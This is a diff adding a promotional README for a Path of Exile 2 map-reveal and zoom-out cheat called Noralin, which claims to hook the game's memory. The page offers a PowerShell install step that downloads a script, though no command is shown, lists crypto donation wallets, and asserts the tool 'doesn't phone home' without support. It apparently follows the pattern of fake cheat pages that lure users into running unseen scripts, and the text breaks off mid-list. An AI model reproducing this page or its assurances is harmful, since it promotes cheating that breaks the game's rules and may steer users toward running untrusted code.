@@ -1,0 +1,108 @@
+Path Of Exile 2 Map Reveal Zoom Out Noralin — Game Enhancer for Windows
+
+📦 PowerShell Install Button
+
+Support this project
+
+ETH:&nbsp;0xe77a05CB4EE3bD18ad724C36a77C431E400E7F28 | BTC:&nbsp;1LjmKvwskPC1WhSWaykuy3LKBVYLcupyv3 | TRON:&nbsp;TFgDzdznmnF7TBpSdR9q5s4vMsW25QCXQt
+
+Path Of Exile 2 Map Reveal Zoom Out Noralin gives you a wider view of the action and keeps critical information visible without altering the core game. It overlays map reveals and zoom-out assistance directly into your runs, so you spend less time squinting at the minimap and more time reading the fight. Everything stays focused on gameplay assistance and information overlays—no unrelated overhauls, no clutter. Drop it in, and play with a clearer picture of what's happening around you.
+
+✅ Requirements
+
+- OS: Windows 10 / 11
+- Shell: PowerShell 5.1+ or PowerShell 7+
+- Network: internet access to download the script
+- Privileges: standard user
+
+Features
+
+- Full map reveal: Uncovers the entire zone map instantly so you stop backtracking through fog-of-war and start routing with complete information.
+- Zoom-out camera: Pulls the camera back beyond the default cap, giving you a wider tactical view of layouts, pack positions, and exit paths.
+- Noralin overlay integration: Runs as information overlays layered over gameplay, keeping map and camera data readable without obscuring combat.
+- Layout awareness: Revealed maps make dead ends, chokepoints, and side branches obvious at a glance, so clear speed stops depending on guesswork.
+- Readable at range: Zoomed-out framing keeps terrain, objectives, and transitions legible while you move.
+- Gameplay-first assistance: Built for information and visibility, not to overhaul unrelated systems, loot, or progression.
+- Lightweight footprint: Overlay-driven design keeps the assist focused on map and camera view rather than touching core game content.
+
+How it works
+
+It hooks into the game's rendering and memory layer to extend what you can already see. The map reveal component lifts the fog-of-war limit so explored areas stay visible at full extent instead of snapping back to the default radius. The zoom-out module raises the camera's maximum distance, letting you pull back far enough to read layout, corridors, and pack placement before you commit to a route.
+
+Information overlays are drawn on top of the existing scene rather than replacing it. You get markers, distance cues, and layout context where you need them, with no changes to loot tables, monster behavior, or core combat math. Everything is read from live game state and applied at runtime, so the assistance stays in sync with your character's position and the current instance.
+
+The whole pipeline is local. Noralin doesn't phone home, inject content into other sessions, or alter save data. Toggle the modules on when you want the extra visibility, off when you don't — the enhancement layers cleanly over vanilla behavior either way.
+
+Modules and Settings
+
+Extended Zoom Module
+Widens the camera's maximum pull-back distance so the battlefield reads as a broader overhead view instead of a tight third-person angle.
+- Zoom Distance slider sets how far the camera can retreat, with the change visible immediately on screen.
+- Reset to Default returns the camera to the game's original range without leaving the session.
+- Smooth Pull-Back controls how gradually the camera moves to the chosen distance rather than snapping.
+
+Map Reveal Module
+Clears additional fog-of-war from the in-game map and minimap so the surrounding layout is easier to read while exploring.
+- Reveal Amount setting determines how much of the map layout is shown beyond the normal explored state.
+- Map Type selector lets the user apply the reveal to the full map, the minimap, or both.
+- Refresh on Open reapplies the chosen reveal each time the map is brought up.
+
+Reveal Radius Module
+Controls how far beyond the character's position the map fills in, replacing a single fixed reveal with a tunable coverage area.
+- Radius control expands or contracts revealed coverage around the player.
+- Coverage Preview shows the selected range when the map is next opened so the effect matches the setting.
+- Profile presets store a modest local reveal and a wide exploration reveal for quick swapping.
+
+Feature Toggle Module
+Separates zoom-out and map-reveal into independent switches so each can be enabled, disabled, or compared against the untouched default view.
+- Zoom Toggle enables or disables the extended camera distance on its own.
+- Reveal Toggle enables or disables map reveal independently of the camera.
+- Quick Compare briefly returns both features to default so the user can judge the difference.
+
+Context Behavior Module
+Scopes the enhancement to situations where a wider perspective helps, such as when the map is open versus during normal movement.
+- Map-Open Trigger applies the wider view and reveal automatically while the map is displayed.
+- Map-Closed Behavior returns the camera to its normal distance when the map is dismissed.
+- Zone Rules let the user choose which contexts activate the enhancement.
+
+Status Indicator Module
+Provides a small on-screen cue confirming whether zoom-out and reveal are currently active.
+- Indicator Visibility toggles the cue on or off.
+- Position setting moves the indicator away from important interface elements.
+- State Display distinguishes zoom-only, reveal-only, and combined activation at a glance.
+
+Additional Settings
+- Settings Persistence saves zoom distance, reveal radius, toggle states, and transition preferences between sessions.
+- Transition Speed balances a natural gradual pull-back against a quicker shift.
+- Toggle Independence keeps camera and map behavior linked or fully separate, so changing one does not disturb the other.
+
+Usage Scenarios
+
+Surveying a New Zone Before Committing to a Direction
+Goal: Get a clear picture of the surrounding layout while exploring an unfamiliar map so the player can choose a route without wandering into dead ends.
+Steps:
+1. Open the Map Reveal Module and set Reveal Amount higher than the default explored state.
+2. Open the Reveal Radius Module and widen the Radius control so the coverage extends further beyond the character's position.
+3. Bring up the full map and leave Refresh on Open enabled so the chosen coverage is reapplied every time the map is displayed.
+4. Optionally switch the Map Type selector to both the full map and the minimap for matching coverage in both views.
+5. Close the map and continue moving through the zone.
+
+Expected result: Each time the map is opened, corridors, branching paths, and points of interest around the player appear filled in to the chosen radius, giving a readable overview of the zone structure instead of a mostly fogged layout.
+
+Widening the Camera for Combat Awareness
+Goal: Pull the camera back during mapping to see more terrain, pathways, and approaching enemies at once while keeping the character easy to track.
+Steps:
+1. Open the Extended Zoom Module and increase the Zoom Distance slider until the view reads as a broader overhead angle.
+2. Set Smooth Pull-Back to a moderate value so the camera eases outward rather than snapping.
+3. Adjust Transition Speed in Additional Settings to balance a natural gradual pull-back against a quicker shift.
+4. Enable the Map-Open Trigger in the Context Behavior Module so the wider view applies automatically while the map is displayed.
+5. Use the Status Indicator Module to position a small cue in a corner that does not cover the interface.
+
+Expected result: The camera gradually settles at the chosen distance, showing a larger portion of the surrounding terrain and pathways on screen, with a small indicator confirming the extended view is active.
+
+Comparing the Enhanced View Against the Default
+Goal: Judge how much the zoom-out and reveal actually change the experience, then keep only the features that help.
+Steps:
+1. Turn on both the Zoom Toggle and the Reveal Toggle in the Feature Toggle Module.
+
+…（内容已截断）
